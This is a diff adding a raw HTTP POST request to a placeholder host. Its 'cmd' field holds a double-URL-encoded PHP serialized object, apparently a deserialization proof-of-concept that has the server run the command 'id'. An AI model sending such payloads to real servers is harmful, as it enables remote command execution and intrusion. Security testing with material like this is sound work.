@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 115
+Connection: close
+
+cmd=O%253A8%253A%2522Exploit%2522%253A1%253A%257Bs%253A4%253A%2522shell%2522%253Bs%253A3%253A%2522id%2522%253B%257D
